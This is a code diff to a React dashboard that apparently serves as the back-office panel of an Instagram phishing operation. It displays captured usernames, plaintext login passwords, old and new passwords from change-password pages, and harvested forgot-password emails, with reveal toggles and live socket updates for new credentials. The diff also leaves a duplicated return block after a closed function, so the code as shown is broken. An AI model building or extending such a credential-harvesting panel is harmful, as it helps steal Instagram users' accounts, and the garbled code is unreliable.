@@ -22,11 +22,13 @@ const SERVICES = [
 const TYPES = [
   { value: "login",           label: "Login",           icon: FiLogIn },
   { value: "change_password", label: "Change Password", icon: FiLock },
+  { value: "forgot_password", label: "Forgot Password", icon: FiHelpCircle },
 ];
 
 const COLUMNS = {
   login:           [{ key: "password",    label: "Password" }],
   change_password: [{ key: "oldPassword", label: "Old Password" }, { key: "newPassword", label: "New Password" }],
+  forgot_password: [{ key: "verified",    label: "Status" }],
 };
 
 const typeMeta = (v) => TYPES.find(t => t.value === v) ?? TYPES[0];
@@ -330,9 +332,110 @@ const SERVICE_BADGE = {
 };
 
 function CredentialRow({ item, columns, revealed, selected, onSelect, onToggleReveal, onEdit, onDelete }) {
+  const isForgot = item.type === "forgot_password";
   const ServiceIcon = SERVICES.find(s => s.value === item.service)?.icon ?? FaInstagram;
   const serviceLabel = SERVICES.find(s => s.value === item.service)?.label ?? item.service;
   const { icon: TypeIcon, label: typeLabel } = typeMeta(item.type);
+
+  return (
+    <tr className={`border-b border-[#0f1e38] transition-colors ${selected ? "bg-[#0f1e38]" : "bg-[#0b1527] hover:bg-[#0d1830]"}`}>
+      <td className="w-10 py-2 pl-4 pr-2">
+        <Checkbox checked={selected} onChange={onSelect} label={`Select ${item.username}`} />
+      </td>
+
+      {/* Service icon — for forgot_password show mail icon instead */}
+      <td className="w-12 px-2 py-2">
+        {isForgot ? (
+          <div title="Forgot Password" className="flex h-7 w-7 items-center justify-center rounded-full border border-[#1e3260] bg-[#0b1527] text-[#3d7aba]">
+            <FiMail size={13} />
+          </div>
+        ) : (
+          <div title={serviceLabel} role="img" aria-label={serviceLabel}
+            className={`flex h-7 w-7 items-center justify-center rounded-full border ${SERVICE_BADGE[item.service] ?? "border-[#1e3260]"}`}>
+            <ServiceIcon size={13} />
+          </div>
+        )}
+      </td>
+
+      {/* Username / Email */}
+      <td className="px-3 py-2">
+        <div className="flex items-center gap-1.5">
+          {isForgot
+            ? <FiMail size={11} className="shrink-0 text-[#3d7aba]" />
+            : <FiUser size={11} className="shrink-0 text-[#3d7aba]" />}
+          <span className="text-[12px] font-semibold text-[#a0bce0]">{item.username}</span>
+        </div>
+      </td>
+
+      {/* Dynamic columns */}
+      {columns.map(c => {
+        if (isForgot && c.key === "verified") {
+          // Verified status badge — no reveal toggle
+          return (
+            <td key={c.key} className="px-3 py-2">
+              {item.verified
+                ? <span className="inline-flex items-center gap-1.5 rounded border border-[#2ecc71]/30 bg-[#2ecc71]/10 px-2 py-0.5 text-[11px] font-semibold text-[#2ecc71]">
+                    <FiCheckCircle size={11} /> Verified
+                  </span>
+                : <span className="inline-flex items-center gap-1.5 rounded border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[11px] font-semibold text-red-400">
+                    <FiXCircle size={11} /> Not verified
+                  </span>
+              }
+            </td>
+          );
+        }
+        const rk = `${item.id}:${c.key}`;
+        const isShown = revealed.has(rk);
+        return (
+          <td key={c.key} className="px-3 py-2">
+            <div className="flex items-center gap-1.5">
+              <FiKey size={11} className="shrink-0 text-[#3d7aba]" />
+              <span className="font-mono text-[11px] text-[#6b8cba] min-w-[6rem]">
+                {isShown ? item[c.key] : "•".repeat(10)}
+              </span>
+              <button onClick={() => onToggleReveal(rk)}
+                aria-label={isShown ? "Hide" : "Show"}
+                className="p-0.5 text-[#3a5a8a] hover:text-[#6ab0ff] transition-colors cursor-pointer">
+                {isShown ? <FiEyeOff size={12} /> : <FiEye size={12} />}
+              </button>
+            </div>
+          </td>
+        );
+      })}
+
+      <td className="px-3 py-2">
+        <span className="inline-flex items-center gap-1 whitespace-nowrap rounded border border-[#1e3260] bg-[#0f1e38] px-1.5 py-0.5 text-[10px] text-[#6b8cba]">
+          <TypeIcon size={10} className="text-[#3d7aba]" />
+          {typeLabel}
+        </span>
+      </td>
+
+      <td className="whitespace-nowrap px-3 py-2">
+        <div className="flex items-center gap-1 text-[11px] text-[#a0bce0]">
+          <FiClock size={10} className="text-[#3d7aba]" />
+          {formatClock(item.at)}
+        </div>
+        <div className="text-[10px] text-[#3a5a8a] leading-tight">{formatRelative(item.at)}</div>
+      </td>
+
+      <td className="py-2 pl-3 pr-4 text-right">
+        <div className="inline-flex gap-0.5">
+          {/* No edit for forgot_password rows */}
+          {!isForgot && (
+            <button onClick={onEdit} aria-label={`Edit ${item.username}`} title="Edit"
+              className="rounded p-1 text-[#3a5a8a] hover:bg-[#1e3260] hover:text-[#6ab0ff] transition-colors cursor-pointer">
+              <FiEdit2 size={12} />
+            </button>
+          )}
+          <button onClick={onDelete} aria-label={`Delete ${item.username}`} title="Delete"
+            className="rounded p-1 text-[#3a5a8a] hover:bg-red-500/10 hover:text-red-400 transition-colors cursor-pointer">
+            <FiTrash2 size={12} />
+          </button>
+        </div>
+      </td>
+    </tr>
+  );
+}
 
   return (
     <tr className={`border-b border-[#0f1e38] transition-colors ${selected ? "bg-[#0f1e38]" : "bg-[#0b1527] hover:bg-[#0d1830]"}`}>
@@ -713,16 +816,33 @@ export default function Database() {
     const id = ++requestId.current;
     setLoading(true); setError(null); setSelected(new Set()); setRevealed(new Set());
     try {
-      const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram`);
-      const json = await res.json();
-      const data = (json?.data?.credentials ?? []);
+      let data;
+      if (type === "forgot_password") {
+        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`);
+        const json = await res.json();
+        // Map forgot records to the unified item shape
+        data = (json?.data?.forgotEmails ?? []).map(f => ({
+          id:       f.id,
+          service:  "instagram",
+          username: f.email,   // email shown in the username column
+          type:     "forgot_password",
+          at:       f.at,
+          verified: f.verified,
+          // no password fields
+          password: null, oldPassword: null, newPassword: null, lastPassword: null,
+        }));
+      } else {
+        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram`);
+        const json = await res.json();
+        data = json?.data?.credentials ?? [];
+      }
       if (id === requestId.current) setItems(data);
     } catch {
       if (id === requestId.current) setError("Could not load records. Please try again.");
     } finally {
       if (id === requestId.current) setLoading(false);
     }
-  }, []);
+  }, [type]);
 
   useEffect(() => { load(); }, [load]);
 
@@ -732,12 +852,15 @@ export default function Database() {
       transports: ["websocket", "polling"],
     });
 
+    // ── Credential events ──
     socket.on("newCredential", (cred) => {
-      setItems(prev => prev.some(r => r.id === cred.id) ? prev : [cred, ...prev]);
+      if (type !== "forgot_password")
+        setItems(prev => prev.some(r => r.id === cred.id) ? prev : [cred, ...prev]);
     });
 
     socket.on("credentialUpdated", (cred) => {
-      setItems(prev => prev.map(r => r.id === cred.id ? cred : r));
+      if (type !== "forgot_password")
+        setItems(prev => prev.map(r => r.id === cred.id ? cred : r));
     });
 
     socket.on("credentialDeleted", ({ id }) => {
@@ -752,16 +875,56 @@ export default function Database() {
     });
 
     socket.on("credentialsCleared", () => {
-      setItems([]);
-      setSelected(new Set());
-      setRevealed(new Set());
+      if (type !== "forgot_password") {
+        setItems([]); setSelected(new Set()); setRevealed(new Set());
+      }
+    });
+
+    // ── Forgot password events ──
+    const mapForgot = f => ({
+      id: f.id, service: "instagram", username: f.email,
+      type: "forgot_password", at: f.at, verified: f.verified,
+      password: null, oldPassword: null, newPassword: null, lastPassword: null,
+    });
+
+    socket.on("forgotEmailCreated", (doc) => {
+      if (type === "forgot_password")
+        setItems(prev => prev.some(r => r.id === doc.id) ? prev : [mapForgot(doc), ...prev]);
+    });
+
+    socket.on("forgotEmailUpdated", (doc) => {
+      if (type === "forgot_password")
+        setItems(prev => prev.map(r => r.id === doc.id ? mapForgot(doc) : r));
+    });
+
+    socket.on("forgotEmailDeleted", ({ id }) => {
+      setItems(prev => prev.filter(r => r.id !== id));
+      setSelected(prev => { const n = new Set(prev); n.delete(id); return n; });
+    });
+
+    socket.on("forgotEmailsDeleted", ({ ids }) => {
+      const idSet = new Set(ids);
+      setItems(prev => prev.filter(r => !idSet.has(r.id)));
+      setSelected(prev => { const n = new Set(prev); ids.forEach(id => n.delete(id)); return n; });
+    });
+
+    socket.on("forgotEmailsCleared", () => {
+      if (type === "forgot_password") {
+        setItems([]); setSelected(new Set());
+      }
     });
 
     return () => socket.disconnect();
-  }, []);
+  }, [type]);
 
   const visible = useMemo(() => {
     let result = items;
+    if (type === "forgot_password") {
+      // Forgot items are already all the same type; just apply text search on email
+      const q = query.trim().toLowerCase();
+      if (q) result = result.filter(r => r.username.includes(q));
+      return result;
+    }
     if (service !== "all") result = result.filter(r => r.service === service);
     result = result.filter(r => r.type === type);
     const q = query.trim().toLowerCase();
@@ -826,18 +989,23 @@ export default function Database() {
   const confirmDelete = async () => {
     const ids = deleting;
     const idSet = new Set(ids);
-    // Optimistic local removal
     setItems(prev => prev.filter(r => !idSet.has(r.id)));
     setSelected(prev => new Set([...prev].filter(id => !idSet.has(id))));
     setRevealed(prev => new Set([...prev].filter(k => !idSet.has(k.split(":")[0]))));
     setDeleting(null);
+
+    const isForgot = type === "forgot_password";
     try {
       if (ids.length === 1) {
-        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/${ids[0]}`, {
-          method: "DELETE",
-        });
+        const url = isForgot
+          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/${ids[0]}`
+          : `${InstagramEndpoints.backendBaseUrl}/api/instagram/${ids[0]}`;
+        await fetch(url, { method: "DELETE" });
       } else {
-        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram`, {
+        const url = isForgot
+          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`
+          : `${InstagramEndpoints.backendBaseUrl}/api/instagram`;
+        await fetch(url, {
           method: "DELETE",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ ids }),
@@ -854,10 +1022,13 @@ export default function Database() {
     setSelected(new Set());
     setRevealed(new Set());
     setClearingAll(false);
+
+    const isForgot = type === "forgot_password";
     try {
-      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/all`, {
-        method: "DELETE",
-      });
+      const url = isForgot
+        ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/all`
+        : `${InstagramEndpoints.backendBaseUrl}/api/instagram/all`;
+      await fetch(url, { method: "DELETE" });
     } catch (err) {
       console.error("Clear all failed:", err);
       load();
@@ -867,37 +1038,8 @@ export default function Database() {
   return (
     <div className="flex-1 flex flex-col overflow-hidden bg-[#060d1c] text-[#a0bce0] font-mono">
 
-      {/* ── Tab bar ── */}
-      <div className="shrink-0 border-b border-[#131e35] bg-[#060d1c] px-3 flex items-center gap-1 pt-2">
-        <button
-          onClick={() => setView("credentials")}
-          className={`flex items-center gap-1.5 px-3 py-2 text-[11px] font-semibold tracking-widest uppercase border-b-2 transition-all cursor-pointer ${
-            view === "credentials"
-              ? "border-[#3d7aba] text-[#6ab0ff]"
-              : "border-transparent text-[#3a5a8a] hover:text-[#6b8cba] hover:border-[#1e3260]"
-          }`}
-        >
-          <FiDatabase size={12} />
-          Credentials
-        </button>
-        <button
-          onClick={() => setView("forgot")}
-          className={`flex items-center gap-1.5 px-3 py-2 text-[11px] font-semibold tracking-widest uppercase border-b-2 transition-all cursor-pointer ${
-            view === "forgot"
-              ? "border-[#3d7aba] text-[#6ab0ff]"
-              : "border-transparent text-[#3a5a8a] hover:text-[#6b8cba] hover:border-[#1e3260]"
-          }`}
-        >
-          <FiMail size={12} />
-          Forgot Password
-        </button>
-      </div>
-
-      {/* ── Forgot view ── */}
-      {view === "forgot" && <ForgotView />}
-
       {/* ── Credentials view ── */}
-      {view === "credentials" && (<>
+      {(<>
 
       {/* ── Controls bar ── */}
       <div className="shrink-0 border-b border-[#131e35] bg-[#080f1e] px-3 py-2">
